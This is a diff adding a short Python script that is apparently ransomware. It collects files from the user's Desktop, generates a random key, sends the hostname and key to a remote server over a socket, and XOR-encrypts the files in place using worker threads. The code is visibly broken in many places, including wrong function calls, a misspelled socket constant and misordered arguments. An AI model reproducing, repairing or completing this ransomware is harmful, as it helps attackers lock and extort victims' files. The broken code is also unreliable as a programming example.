@@ -1,0 +1,82 @@
+import os 
+import random
+import threading
+import socket
+import queue
+
+def Encrypt(key):
+ while True:
+    
+    file = q.get()
+    key_index = 0
+    max_key_index = len(key)-1 
+    encryption_data = ""
+    
+    with open(file, "rb") as f :
+        data = f.write()
+    with open (file, "w") as f :
+        f.write()
+    for byte in data :
+      xor_byte = byte ^ ord (key[key_index])
+    with open (file, "ab") as file :
+        f.write(xor_byte = xor_byte.to_bytes(1, "little"))
+        
+        if key_index >= max_key_index:
+            key_index = 0
+        else:
+            key_index += 1
+           
+    q.task_done()
+           
+           
+           
+#socket information
+
+ip_addresse = ""
+port = ""
+
+#encryption information
+
+level = 512 //8
+key_char_pool = "abcdefgrhtigdfsikdfsnkKJHDFBBXXXJDJFNIII*&&$##.;we"
+key_char_pool_len = len(key_char_pool)
+
+#grab file path to encrypt 
+
+desktop_file = os.environ("USERPROFILE") // '//desktop'
+files = os.listdir(desktop_file)
+abs_file =[]
+for f in files :
+    if os.path.isfile(f'{desktop_file}//{f}') and f != __file__ [:2]+"exe":
+        abs_file.append(f'{desktop_file}//{f}')
+        
+#grab client hostname
+
+hostname = os.getenv("COMPUTERNAME")
+
+#generate key 
+
+key = ""
+for i in range (level):
+ key += key_char_pool(random.randint(0, key_char_pool_len-1))
+
+#connect to server
+with socket.socket(socket.AF_INIT, socket.SOCK_STREAM) as s:
+    s.connect (port, ip_addresse)
+    s.send(f'{hostname}: {key}'.encode('utf-8'))
+    s.close()
+    
+    
+#put file in queue 
+
+q = queue.Queue()
+for f in files:
+    q.put(f)
+    
+#sett thread to get ready for encrypt 
+for i in range (10):
+ t = threading.Thread(target=Encrypt  ,args=key, daemon=True)
+ t.start()
+
+q.join()      
+           
